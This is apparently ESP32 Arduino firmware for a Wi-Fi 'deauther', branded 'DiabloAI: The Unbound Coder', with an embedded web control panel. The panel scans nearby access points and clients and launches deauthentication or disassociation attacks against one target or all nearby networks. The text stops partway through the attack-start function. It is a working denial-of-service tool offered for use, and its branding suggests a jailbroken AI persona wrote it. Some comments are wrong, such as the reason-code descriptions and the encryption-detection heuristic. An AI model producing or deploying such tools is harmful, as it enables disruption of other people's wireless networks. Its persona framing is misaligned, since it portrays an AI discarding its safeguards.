#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h> // Included for completeness, though AsyncWebServer is primarily used
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <AsyncWebSocket.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_system.h>
#include <esp_event.h>
#include <esp_log.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>
#include <ArduinoJson.h> // Ensure you have this library installed (e.g., v6.x)
#include <map>           // REQUIRED for std::map data structure

// --- Global Constants and Definitions ---
// WiFi credentials for the ESP32's SoftAP
const char* AP_SSID = "DiabloAI_Deauther";
const char* AP_PASSWORD = "password123"; // !!! IMPORTANT: CHANGE THIS TO A STRONG PASSWORD !!!

// 802.11 Frame Definitions
#define TYPE_MANAGEMENT 0x00
#define SUBTYPE_DEAUTH 0x0C
#define SUBTYPE_DISASSOC 0x0A

// Reason Codes (IEEE 802.11-2012, Annex C)
#define REASON_UNSPECIFIED 0x0001 // Unspecified reason
#define REASON_AP_HAS_LEFT 0x0003 // Disassociated due to AP having insufficient resources to handle another STA
#define REASON_STA_LEAVING 0x0008 // Disassociated because station is leaving BSS (or ESS)

// Attack types
#define ATTACK_TYPE_NONE 0
#define ATTACK_TYPE_DEAUTH 1
#define ATTACK_TYPE_DISASSOC 2

// --- Web Server and WebSocket Objects ---
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

// --- Data Structures for APs and Clients ---
// MacAddress struct definition
struct MacAddress {
    uint8_t bytes[6];
    bool operator==(const MacAddress& other) const {
        return memcmp(bytes, other.bytes, 6) == 0;
    }
    // Operator< is required for std::map to order keys
    bool operator<(const MacAddress& other) const {
        return memcmp(bytes, other.bytes, 6) < 0;
    }
    String toString() const {
        char buf[18];
        sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
                bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]);
        return String(buf);
    }
};

// AccessPointInfo struct definition
struct AccessPointInfo {
    MacAddress bssid;
    String ssid;
    int32_t rssi;
    uint8_t channel;
    String encryption;
    unsigned long lastSeen;
};

// ClientInfo struct definition
struct ClientInfo {
    MacAddress mac;
    MacAddress associatedApBssid; // The AP this client is associated with (if known)
    int32_t rssi;
    uint8_t channel;
    unsigned long lastSeen;
};

// Use std::map for efficient lookup and update based on MAC address
std::map<MacAddress, AccessPointInfo> discoveredAPs;
std::map<MacAddress, ClientInfo> discoveredClients;

// Mutexes for protecting shared data structures (APs, Clients, attack parameters)
SemaphoreHandle_t xScanDataMutex;
SemaphoreHandle_t xAttackControlMutex;

// --- Attack Parameters ---
MacAddress currentTargetMac;
MacAddress currentTargetApBssid; // For client deauth/disassoc, this is the AP the client is connected to
int currentAttackType = ATTACK_TYPE_NONE;
uint8_t currentAttackChannel = 0;
bool isAttacking = false;
bool isChannelHopping = false;
unsigned long packetsSent = 0;
TaskHandle_t attackTaskHandle = NULL;
bool isScanning = false; // Track scan state for UI

// --- Promiscuous Mode Globals ---
// Structure for 802.11 MAC header (simplified for our needs)
typedef struct {
    unsigned frame_ctrl : 16;
    unsigned duration_id : 16;
    uint8_t addr1[6]; // DA (Destination Address) or RA (Receiver Address)
    uint8_t addr2[6]; // SA (Source Address) or TA (Transmitter Address)
    uint8_t addr3[6]; // BSSID or DA/SA (depends on ToDS/FromDS)
    unsigned sequence_ctrl : 16;
    uint8_t addr4[6]; // Optional (only present if ToDS and FromDS are both set)
} wifi_ieee80211_mac_hdr_t;

// Structure for 802.11 Management frame (simplified for our needs)
typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0]; // Variable length payload
} wifi_ieee80211_packet_t;

// --- Function Prototypes (All functions declared before setup() and loop()) ---
void setupWiFi();
void setupWebServer();
void setupWebSocket();
void handleWebSocketMessage(void *arg, uint8_t *data, size_t len);
void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len);
void startScan();
void stopScan();
void startAttack(MacAddress targetMac, MacAddress targetApBssid, int attackType, uint8_t channel, bool channelHop);
void stopAttack();
void attackTask(void *pvParameters);
void sendDeauthFrame(MacAddress targetMac, MacAddress apMac, uint8_t channel, uint16_t reasonCode);
void sendDisassocFrame(MacAddress targetMac, MacAddress apMac, uint8_t channel, uint16_t reasonCode);
void wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type);
void sendScanResultsToClients();
void sendAttackStatusToClients();
void stringToMac(const String& macStr, uint8_t* macBytes);
String getEncryptionType(wifi_auth_mode_t authMode);
String getChannelBand(uint8_t channel); // This function is not strictly needed but kept for completeness

// --- Embedded Web UI HTML, CSS, and JavaScript ---
// Minified and optimized for single file inclusion.
// Using R"rawstring(...)rawstring" for multi-line string literals.
const char* HTML_CONTENT = R"rawstring(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DiabloAI Deauther</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #000000 0%, #1a001a 100%);
            color: #FF69B4; /* Neon Pink */
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .container {
            flex-grow: 1;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
            width: 100%;
            box-sizing: border-box;
        }
        h1, h2 {
            text-align: center;
            color: #FF69B4;
            text-shadow: 0 0 8px #FF69B4, 0 0 15px #FF69B4;
            margin-bottom: 20px;
            font-weight: 700;
        }
        .card {
            background-color: rgba(0, 0, 0, 0.7);
            border: 1px solid #FF69B4;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
            box-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
        }
        .button-group {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
            margin-top: 15px;
        }
        button {
            background: linear-gradient(45deg, #FF69B4, #CC0066);
            color: #FFF;
            border: none;
            border-radius: 8px;
            padding: 10px 15px;
            font-size: 1em;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 5px #FF69B4;
            font-weight: 700;
            flex: 1 1 auto; /* Allow buttons to grow and shrink */
            min-width: 120px; /* Minimum width for buttons */
        }
        button:hover {
            background: linear-gradient(45deg, #CC0066, #FF69B4);
            box-shadow: 0 0 15px #FF69B4, 0 0 25px #FF69B4;
            transform: translateY(-2px);
        }
        button:active {
            transform: translateY(0);
            box-shadow: 0 0 5px #FF69B4;
        }
        button.active {
            background: linear-gradient(45deg, #00FF00, #00AA00);
            box-shadow: 0 0 15px #00FF00, 0 0 25px #00FF00;
        }
        select, input[type="text"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border-radius: 8px;
            border: 1px solid #FF69B4;
            background-color: rgba(0, 0, 0, 0.5);
            color: #FF69B4;
            font-size: 1em;
            box-sizing: border-box;
        }
        select option {
            background-color: #000;
            color: #FF69B4;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            font-size: 0.9em;
        }
        th, td {
            border: 1px solid #CC0066;
            padding: 8px;
            text-align: left;
            word-break: break-all; /* Ensure long MACs break */
        }
        th {
            background-color: rgba(255, 105, 180, 0.2);
        }
        .status-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px dashed rgba(255, 105, 180, 0.3);
        }
        .status-item:last-child {
            border-bottom: none;
        }
        .status-label {
            font-weight: bold;
        }
        .status-value {
            color: #00FF00; /* Green for active status */
            text-shadow: 0 0 5px #00FF00;
        }
        .status-value.inactive {
            color: #FF69B4; /* Pink for inactive */
            text-shadow: 0 0 5px #FF69B4;
        }
        @media (max-width: 600px) {
            .container {
                padding: 10px;
            }
            h1 {
                font-size: 1.8em;
            }
            h2 {
                font-size: 1.4em;
            }
            button {
                padding: 8px 10px;
                font-size: 0.9em;
                min-width: unset;
            }
            th, td {
                padding: 6px;
                font-size: 0.8em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DiabloAI: The Unbound Coder</h1>

        <div class="card">
            <h2>Wi-Fi Scanner</h2>
            <div class="button-group">
                <button id="startScanBtn">Start Scan</button>
                <button id="stopScanBtn">Stop Scan</button>
            </div>
            <h3>Access Points</h3>
            <table id="apTable">
                <thead>
                    <tr>
                        <th>SSID</th>
                        <th>BSSID</th>
                        <th>Channel</th>
                        <th>RSSI</th>
                        <th>Encryption</th>
                        <th>Select</th>
                    </tr>
                </thead>
                <tbody>
                    </tbody>
            </table>
            <h3>Clients</h3>
            <table id="clientTable">
                <thead>
                    <tr>
                        <th>MAC</th>
                        <th>Associated AP</th>
                        <th>Channel</th>
                        <th>RSSI</th>
                        <th>Select</th>
                    </tr>
                </thead>
                <tbody>
                    </tbody>
            </table>
        </div>

        <div class="card">
            <h2>Attack Control Panel</h2>
            <label for="attackType">Attack Type:</label>
            <select id="attackType">
                <option value="0">None</option>
                <option value="1">Deauthentication</option>
                <option value="2">Disassociation</option>
            </select>

            <label for="targetSelect">Target:</label>
            <select id="targetSelect">
                <option value="">Select an AP or Client</option>
                <option value="ALL_NEARBY">All Nearby APs/Clients</option>
                </select>

            <label for="channelSelect">Channel:</label>
            <select id="channelSelect">
                <option value="0">Auto (Current Scan Channel)</option>
                <option value="1">1</option><option value="2">2</option><option value="3">3</option>
                <option value="4">4</option><option value="5">5</option><option value="6">6</option>
                <option value="7">7</option><option value="8">8</option><option value="9">9</option>
                <option value="10">10</option><option value="11">11</option><option value="12">12</option>
                <option value="13">13</option><option value="14">14</option>
            </select>

            <div class="button-group">
                <button id="startAttackBtn">Start Attack</button>
                <button id="stopAttackBtn">Stop Attack</button>
            </div>
        </div>

        <div class="card">
            <h2>Status Indicators</h2>
            <div class="status-item">
                <span class="status-label">Current Target:</span>
                <span id="statusTarget" class="status-value inactive">None</span>
            </div>
            <div class="status-item">
                <span class="status-label">Attack Type:</span>
                <span id="statusAttackType" class="status-value inactive">None</span>
            </div>
            <div class="status-item">
                <span class="status-label">Packets Sent:</span>
                <span id="statusPackets" class="status-value inactive">0</span>
            </div>
            <div class="status-item">
                <span class="status-label">Current Channel:</span>
                <span id="statusChannel" class="status-value inactive">N/A</span>
            </div>
            <div class="status-item">
                <span class="status-label">Channel Hopping:</span>
                <span id="statusChannelHopping" class="status-value inactive">Off</span>
            </div>
            <div class="status-item">
                <span class="status-label">Scanning:</span>
                <span id="statusScanning" class="status-value inactive">Off</span>
            </div>
        </div>
    </div>

    <script>
        var ws;
        var scanInterval;
        var currentAPs = {};
        var currentClients = {};

        window.onload = function() {
            initWebSocket();
            setupEventListeners();
        };

        function initWebSocket() {
            ws = new WebSocket(`ws://${window.location.hostname}/ws`);

            ws.onopen = function() {
                console.log('WebSocket connection opened');
                // Request initial status and scan data upon connection
                ws.send(JSON.stringify({ command: "GET_STATUS" }));
                ws.send(JSON.stringify({ command: "GET_SCAN_DATA" }));
            };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                console.log('Received:', data);

                if (data.type === "SCAN_RESULTS") {
                    updateScanTables(data.aps, data.clients);
                } else if (data.type === "ATTACK_STATUS") {
                    updateAttackStatus(data);
                } else if (data.type === "INITIAL_STATUS") {
                    updateAttackStatus(data);
                    updateScanTables(data.aps, data.clients);
                }
            };

            ws.onclose = function() {
                console.log('WebSocket connection closed. Reconnecting...');
                setTimeout(initWebSocket, 2000); // Attempt to reconnect every 2 seconds
            };

            ws.onerror = function(error) {
                console.error('WebSocket Error:', error);
            };
        }

        function setupEventListeners() {
            document.getElementById('startScanBtn').addEventListener('click', function() {
                ws.send(JSON.stringify({ command: "START_SCAN" }));
                // UI update for scanning status is handled by the server's ATTACK_STATUS message
            });

            document.getElementById('stopScanBtn').addEventListener('click', function() {
                ws.send(JSON.stringify({ command: "STOP_SCAN" }));
                // UI update for scanning status is handled by the server's ATTACK_STATUS message
            });

            document.getElementById('startAttackBtn').addEventListener('click', function() {
                const attackType = document.getElementById('attackType').value;
                const targetValue = document.getElementById('targetSelect').value;
                const channel = document.getElementById('channelSelect').value;

                if (attackType === "0" || !targetValue) {
                    // Using a simple alert for immediate user feedback as per previous code,
                    // but a custom modal would be better in a production app.
                    alert("Please select an attack type and a target.");
                    return;
                }

                let targetMac = "";
                let targetApBssid = "";
                let isChannelHopping = false;

                if (targetValue === "ALL_NEARBY") {
                    isChannelHopping = true; // Channel hop for "all nearby"
                    // When targeting "ALL_NEARBY", set targetMac and targetApBssid to all zeros
                    // This signals the ESP32 to use broadcast MACs for deauth/disassoc
                    targetMac = "00:00:00:00:00:00";
                    targetApBssid = "00:00:00:00:00:00";
                } else if (targetValue.startsWith("AP_")) {
                    targetMac = targetValue.substring(3); // Remove "AP_" prefix
                    targetApBssid = targetMac; // For AP, BSSID is the target MAC
                } else if (targetValue.startsWith("CLIENT_")) {
                    targetMac = targetValue.substring(7); // Remove "CLIENT_" prefix
                    // Find the associated AP BSSID for this client from currentClients map
                    for (const macKey in currentClients) {
                        if (currentClients[macKey].mac === targetMac) {
                            targetApBssid = currentClients[macKey].associatedApBssid;
                            break;
                        }
                    }
                    if (!targetApBssid || targetApBssid === "00:00:00:00:00:00") {
                        alert("Could not determine associated AP for the selected client. Please select an AP or 'All Nearby'.");
                        return;
                    }
                }

                const command = {
                    command: "START_ATTACK",
                    attackType: parseInt(attackType),
                    targetMac: targetMac,
                    targetApBssid: targetApBssid,
                    channel: parseInt(channel),
                    channelHopping: isChannelHopping
                };
                ws.send(JSON.stringify(command));
            });

            document.getElementById('stopAttackBtn').addEventListener('click', function() {
                ws.send(JSON.stringify({ command: "STOP_ATTACK" }));
            });
        }

        function updateScanTables(aps, clients) {
            const apTableBody = document.getElementById('apTable').getElementsByTagName('tbody')[0];
            const clientTableBody = document.getElementById('clientTable').getElementsByTagName('tbody')[0];
            const targetSelect = document.getElementById('targetSelect');

            apTableBody.innerHTML = '';
            clientTableBody.innerHTML = '';

            // Clear previous options except "Select an AP or Client" and "All Nearby"
            // Re-add them to ensure they are always at the top
            targetSelect.innerHTML = '<option value="">Select an AP or Client</option><option value="ALL_NEARBY">All Nearby APs/Clients</option>';


            currentAPs = {};
            currentClients = {};

            // Populate AP table and target selection
            aps.forEach(ap => {
                currentAPs[ap.bssid] = ap;
                const row = apTableBody.insertRow();
                row.insertCell().textContent = ap.ssid;
                row.insertCell().textContent = ap.bssid;
                row.insertCell().textContent = ap.channel;
                row.insertCell().textContent = ap.rssi;
                row.insertCell().textContent = ap.encryption;
                const selectCell = row.insertCell();
                const selectBtn = document.createElement('button');
                selectBtn.textContent = 'Select AP';
                selectBtn.classList.add('select-btn'); // Add class for styling if needed
                selectBtn.onclick = () => {
                    document.getElementById('targetSelect').value = `AP_${ap.bssid}`;
                };
                selectCell.appendChild(selectBtn);

                const option = document.createElement('option');
                option.value = `AP_${ap.bssid}`;
                option.textContent = `AP: ${ap.ssid} (${ap.bssid})`;
                targetSelect.appendChild(option);
            });

            // Populate Client table and target selection
            clients.forEach(client => {
                currentClients[client.mac] = client;
                const row = clientTableBody.insertRow();
                row.insertCell().textContent = client.mac;
                row.insertCell().textContent = client.associatedApBssid || 'N/A';
                row.insertCell().textContent = client.channel;
                row.insertCell().textContent = client.rssi;
                const selectCell = row.insertCell();
                const selectBtn = document.createElement('button');
                selectBtn.textContent = 'Select Client';
                selectBtn.classList.add('select-btn'); // Add class for styling if needed
                selectBtn.onclick = () => {
                    document.getElementById('targetSelect').value = `CLIENT_${client.mac}`;
                };
                selectCell.appendChild(selectBtn);

                const option = document.createElement('option');
                option.value = `CLIENT_${client.mac}`;
                option.textContent = `Client: ${client.mac} (AP: ${client.associatedApBssid || 'N/A'})`;
                targetSelect.appendChild(option);
            });
        }

        function updateAttackStatus(status) {
            document.getElementById('statusTarget').textContent = status.targetMac || "None";
            document.getElementById('statusTarget').classList.toggle('inactive', !status.targetMac || status.targetMac === "00:00:00:00:00:00");

            let attackTypeStr = "None";
            if (status.attackType === 1) attackTypeStr = "Deauthentication";
            if (status.attackType === 2) attackTypeStr = "Disassociation";
            document.getElementById('statusAttackType').textContent = attackTypeStr;
            document.getElementById('statusAttackType').classList.toggle('inactive', status.attackType === 0);

            document.getElementById('statusPackets').textContent = status.packetsSent;
            document.getElementById('statusPackets').classList.toggle('inactive', status.packetsSent === 0);

            document.getElementById('statusChannel').textContent = status.currentChannel || "N/A";
            document.getElementById('statusChannel').classList.toggle('inactive', status.currentChannel === 0);

            document.getElementById('statusChannelHopping').textContent = status.channelHopping ? "On" : "Off";
            document.getElementById('statusChannelHopping').classList.toggle('inactive', !status.channelHopping);

            // Update scanning status based on server feedback
            document.getElementById('statusScanning').textContent = status.isScanning ? "On" : "Off";
            document.getElementById('statusScanning').classList.toggle('inactive', !status.isScanning);


            // Update button states
            const startAttackBtn = document.getElementById('startAttackBtn');
            const stopAttackBtn = document.getElementById('stopAttackBtn');
            if (status.isAttacking) {
                startAttackBtn.classList.add('active');
                stopAttackBtn.classList.remove('active');
            } else {
                startAttackBtn.classList.remove('active');
                stopAttackBtn.classList.add('active');
            }

            const startScanBtn = document.getElementById('startScanBtn');
            const stopScanBtn = document.getElementById('stopScanBtn');
            if (status.isScanning) {
                startScanBtn.classList.add('active');
                stopScanBtn.classList.remove('active');
            } else {
                startScanBtn.classList.remove('active');
                stopScanBtn.classList.add('active');
            }
        }
    </script>
</body>
</html>
)rawstring";

// --- Setup Function ---
void setup() {
    Serial.begin(115200);
    Serial.println("\n[DiabloAI] Initializing ESP32 Deauther...");

    // Create mutexes for thread safety
    xScanDataMutex = xSemaphoreCreateMutex();
    xAttackControlMutex = xSemaphoreCreateMutex();

    setupWiFi();
    setupWebServer();
    setupWebSocket();

    // Start promiscuous mode for client discovery
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_cb);

    Serial.println("[DiabloAI] Setup complete. Access Web UI at http://192.168.4.1");
}

// --- Loop Function (minimal, as tasks handle most operations) ---
void loop() {
    // Web server and WebSocket handle events asynchronously
    // Attack task runs independently
    // Promiscuous mode callback runs on WiFi events
    vTaskDelay(10 / portTICK_PERIOD_MS); // Small delay to yield to other tasks
}

// --- WiFi Setup ---
void setupWiFi() {
    WiFi.mode(WIFI_AP_STA); // AP for Web UI, STA for scanning/attacking

    // Configure SoftAP
    WiFi.softAP(AP_SSID, AP_PASSWORD);
    IPAddress IP = WiFi.softAPIP();
    Serial.print("[DiabloAI] AP IP address: ");
    Serial.println(IP);

    // Set initial WiFi channel for promiscuous mode.
    // WiFi.scanNetworks will temporarily change channels for scanning.
    // This sets the default channel when not actively scanning or attacking a specific channel.
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    Serial.println("[DiabloAI] WiFi AP and STA modes configured.");
}

// --- Web Server Setup ---
void setupWebServer() {
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", HTML_CONTENT);
    });

    server.onNotFound([](AsyncWebServerRequest *request){
        request->send(404, "text/plain", "Not Found");
    });

    server.begin();
    Serial.println("[DiabloAI] Web server started.");
}

// --- WebSocket Setup ---
void setupWebSocket() {
    ws.onEvent(onWsEvent);
    server.addHandler(&ws);
    Serial.println("[DiabloAI] WebSocket server started.");
}

// --- WebSocket Event Handler ---
void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
    switch (type) {
        case WS_EVT_CONNECT:
            Serial.printf("[DiabloAI] WebSocket client #%u connected from %s\n", client->id(), client->remoteIP().toString().c_str());
            // Send initial status and scan data to new client
            sendAttackStatusToClients();
            sendScanResultsToClients();
            break;
        case WS_EVT_DISCONNECT:
            Serial.printf("[DiabloAI] WebSocket client #%u disconnected\n", client->id());
            break;
        case WS_EVT_DATA:
            handleWebSocketMessage(arg, data, len);
            break;
        case WS_EVT_PONG:
        case WS_EVT_ERROR:
            break;
    }
}

// --- Handle Incoming WebSocket Messages ---
void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
    AwsFrameInfo *info = (AwsFrameInfo*)arg;
    if (info->final && info->index == 0 && info->len == len && info->opcode == WS_TEXT) {
        // Ensure data is null-terminated for String conversion and JSON parsing
        char* msg_buf = (char*)malloc(len + 1);
        if (msg_buf == NULL) {
            Serial.println("[DiabloAI] Failed to allocate memory for WS message.");
            return;
        }
        memcpy(msg_buf, data, len);
        msg_buf[len] = '\0';
        String message = msg_buf;
        free(msg_buf); // Free allocated memory

        Serial.printf("[DiabloAI] Received WS message: %s\n", message.c_str());

        // Use a larger buffer for DynamicJsonDocument if messages are complex
        DynamicJsonDocument doc(1536); // Increased size for potentially larger messages
        DeserializationError error = deserializeJson(doc, message);

        if (error) {
            Serial.print(F("[DiabloAI] deserializeJson() failed: "));
            Serial.println(error.f_str());
            return;
        }

        String command = doc["command"].as<String>();

        if (command == "START_SCAN") {
            startScan();
        } else if (command == "STOP_SCAN") {
            stopScan();
        } else if (command == "START_ATTACK") {
            String targetMacStr = doc["targetMac"].as<String>();
            String targetApBssidStr = doc["targetApBssid"].as<String>();
            int attackType = doc["attackType"].as<int>();
            uint8_t channel = doc["channel"].as<uint8_t>();
            bool channelHopping = doc["channelHopping"].as<bool>();

            MacAddress targetMac, targetApBssid;
            stringToMac(targetMacStr, targetMac.bytes);
            stringToMac(targetApBssidStr, targetApBssid.bytes);

            startAttack(targetMac, targetApBssid, attackType, channel, channelHopping);
        } else if (command == "STOP_ATTACK") {
            stopAttack();
        } else if (command == "GET_STATUS") {
            sendAttackStatusToClients();
            sendScanResultsToClients();
        } else if (command == "GET_SCAN_DATA") {
            sendScanResultsToClients();
        }
    }
}

// --- Wi-Fi Scanning Functions ---
void startScan() {
    Serial.println("[DiabloAI] Starting Wi-Fi scan...");
    if (xSemaphoreTake(xScanDataMutex, portMAX_DELAY) == pdTRUE) {
        discoveredAPs.clear();
        discoveredClients.clear();
        isScanning = true; // Update internal scanning state
        xSemaphoreGive(xScanDataMutex);
    }
    // Start asynchronous scan for APs
    WiFi.scanNetworks(true, true); // true for async, true for hidden SSIDs
    sendAttackStatusToClients(); // Update UI with scanning status
}

void stopScan() {
    Serial.println("[DiabloAI] Stopping Wi-Fi scan...");
    WiFi.scanDelete(); // Stop ongoing scan
    if (xSemaphoreTake(xScanDataMutex, portMAX_DELAY) == pdTRUE) {
        isScanning = false; // Update internal scanning state
        xSemaphoreGive(xScanDataMutex);
    }
    sendAttackStatusToClients(); // Update UI with scanning status
}

// --- Promiscuous Mode Sniffer Callback ---
void wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
    wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

    // Filter for management frames (Type 0)
    // Frame Control field: bits 2 and 3 define the Type.
    // 0x00FC mask: 0000 0000 1111 1100 (binary) -> isolates bits 2-7
    // (TYPE_MANAGEMENT << 2): 00 (binary) shifted left by 2 -> 0000 0000 (binary)
    // This condition checks if the frame is a Management frame (Type 0).
    if (((hdr->frame_ctrl & 0x00FC) >> 2) == TYPE_MANAGEMENT) {
        uint8_t* mac_addr_sa = hdr->addr2; // Source Address (SA)
        uint8_t* mac_addr_da = hdr->addr1; // Destination Address (DA)
        // BSSID can be addr1, addr2, or addr3 depending on ToDS/FromDS bits.
        // For Beacon/Probe Response, BSSID is usually SA (addr2).
        // For Association Request, BSSID is usually DA (addr1).

        uint8_t subtype = (hdr->frame_ctrl >> 4) & 0x0F; // Subtype (bits 4-7)

        // Acquire mutex before modifying shared data to prevent race conditions
        if (xSemaphoreTake(xScanDataMutex, (TickType_t)10) == pdTRUE) { // Try to take mutex, don't block for long
            // Process Beacon frames (Subtype 0x08) and Probe Response (Subtype 0x05) for APs
            if (subtype == 0x08 || subtype == 0x05) {
                AccessPointInfo ap;
                memcpy(ap.bssid.bytes, mac_addr_sa, 6); // BSSID is SA in Beacon/Probe Response
                ap.rssi = pkt->rx_ctrl.rssi;
                ap.channel = pkt->rx_ctrl.channel;
                ap.lastSeen = millis();

                // Extract SSID from Information Elements (IEs)
                uint8_t* current_ie = ipkt->payload;
                size_t payload_len = pkt->rx_ctrl.sig_len - sizeof(wifi_ieee80211_mac_hdr_t); // Remaining payload length after header
                ap.ssid = "<hidden>"; // Default for hidden SSIDs or if not found

                // Iterate through IEs to find SSID (Element ID 0)
                while (current_ie < (uint8_t*)ipkt + pkt->rx_ctrl.sig_len && (current_ie - (uint8_t*)ipkt) < payload_len) {
                    uint8_t element_id = current_ie[0];
                    uint8_t element_len = current_ie[1];

                    if (element_id == 0x00) { // SSID Element ID
                        if (element_len > 0 && (current_ie + 2 + element_len) <= ((uint8_t*)ipkt + pkt->rx_ctrl.sig_len)) {
                            ap.ssid = String((char*)(current_ie + 2), element_len);
                        } else {
                            ap.ssid = "<hidden>"; // SSID length is 0 for hidden networks
                        }
                        break; // Found SSID, no need to parse further for this AP
                    }
                    // Move to next IE
                    current_ie += (element_len + 2);
                }

                // Simplified encryption detection (more robust parsing of capabilities IE would be needed)
                // For now, a basic check based on common patterns
                if (pkt->rx_ctrl.cwb == WIFI_BW_HT40 || pkt->rx_ctrl.mcs == 7) { // Heuristic for modern networks
                     ap.encryption = "WPA2/WPA3";
                } else {
                    ap.encryption = "WPA/WPA2"; // Default for older or less specific detection
                }

                discoveredAPs[ap.bssid] = ap;
            }
            // Process Probe Request frames (Subtype 0x04) for clients
            else if (subtype == 0x04) {
                ClientInfo client;
                memcpy(client.mac.bytes, mac_addr_sa, 6); // Client MAC is SA in Probe Request
                client.rssi = pkt->rx_ctrl.rssi;
                client.channel = pkt->rx_ctrl.channel;
                client.lastSeen = millis();
                // Associated AP BSSID is unknown from a probe request alone
                memset(client.associatedApBssid.bytes, 0, 6); // Set to 00:00:00:00:00:00 (unknown)

                discoveredClients[client.mac] = client;
            }
            // Process Association Request frames (Subtype 0x00) for clients
            else if (subtype == 0x00) {
                ClientInfo client;
                memcpy(client.mac.bytes, mac_addr_sa, 6); // Client MAC is SA
                memcpy(client.associatedApBssid.bytes, mac_addr_da, 6); // AP BSSID is DA
                client.rssi = pkt->rx_ctrl.rssi;
                client.channel = pkt->rx_ctrl.channel;
                client.lastSeen = millis();

                discoveredClients[client.mac] = client;
            }
            xSemaphoreGive(xScanDataMutex);
        }
    }
}

// --- Send Scan Results to Web UI ---
void sendScanResultsToClients() {
    DynamicJsonDocument doc(4096); // Adjust size as needed for many APs/Clients
    doc["type"] = "SCAN_RESULTS";

    JsonArray apsArray = doc.createNestedArray("aps");
    JsonArray clientsArray = doc.createNestedArray("clients");

    if (xSemaphoreTake(xScanDataMutex, portMAX_DELAY) == pdTRUE) {
        for (auto const& [mac, apInfo] : discoveredAPs) {
            JsonObject apObj = apsArray.add<JsonObject>();
            apObj["bssid"] = apInfo.bssid.toString();
            apObj["ssid"] = apInfo.ssid;
            apObj["channel"] = apInfo.channel;
            apObj["rssi"] = apInfo.rssi;
            apObj["encryption"] = apInfo.encryption;
            apObj["lastSeen"] = apInfo.lastSeen;
        }

        for (auto const& [mac, clientInfo] : discoveredClients) {
            JsonObject clientObj = clientsArray.add<JsonObject>();
            clientObj["mac"] = clientInfo.mac.toString();
            clientObj["associatedApBssid"] = clientInfo.associatedApBssid.toString();
            clientObj["channel"] = clientInfo.channel;
            clientObj["rssi"] = clientInfo.rssi;
            clientObj["lastSeen"] = clientInfo.lastSeen;
        }
        xSemaphoreGive(xScanDataMutex);
    }

    String jsonString;
    serializeJson(doc, jsonString);
    ws.textAll(jsonString);
}

// --- Send Attack Status to Web UI ---
void sendAttackStatusToClients() {
    DynamicJsonDocument doc(512);
    doc["type"] = "ATTACK_STATUS";

    if (xSemaphoreTake(xAttackControlMutex, portMAX_DELAY) == pdTRUE) {
        doc["isAttacking"] = isAttacking;
        doc["attackType"] = currentAttackType;
        doc["targetMac"] = currentTargetMac.toString();
        doc["targetApBssid"] = currentTargetApBssid.toString();
        doc["currentChannel"] = currentAttackChannel;
        doc["channelHopping"] = isChannelHopping;
        doc["packetsSent"] = packetsSent;
        doc["isScanning"] = isScanning; // Use the internal flag
        xSemaphoreGive(xAttackControlMutex);
    } else {
        // Fallback if mutex cannot be acquired immediately
        doc["isAttacking"] = false;
        doc["attackType"] = ATTACK_TYPE_NONE;
        doc["targetMac"] = "N/A";
        doc["targetApBssid"] = "N/A";
        doc["currentChannel"] = 0;
        doc["channelHopping"] = false;
        doc["packetsSent"] = 0;
        doc["isScanning"] = isScanning; // Use the internal flag
    }

    String jsonString;
    serializeJson(doc, jsonString);
    ws.textAll(jsonString);
}

// --- Attack Control Functions ---
void startAttack(MacAddress targetMac, MacAddress targetApBssid, int attackType, uint8_t channel, bool channelHop) {
    if (xSemaphoreTake(xAttackControlMutex, portMAX_DELAY) == pdTRUE) {
        if (isAttacking) {
            Serial.println("[DiabloAI] Attack already in progress. Stopping current attack first.");
            stopAttack(); // Stop any existing attack before starting a new one
            // Give a small delay for the task to terminate
            vTaskDelay(50 / portTICK_PERIOD_MS);
        }

        currentTargetMac = targetMac;
        currentTargetApBssid = targetApBssid;
        currentAttackType = attackType;
        currentAttackChannel = channel;
        isChannelHopping = channelHop;
        packetsSent = 0;
        isAttacking = true;

        Serial.printf("[DiabloAI] Starting attack: Type=%d, Target=%s, AP=%s, Channel=%d, Hopping=%s\n",
                      attackType, targetMac.toString().c_str(), targetApBssid.toString().c_str(), channel, channelHop ? "Yes" : "No");

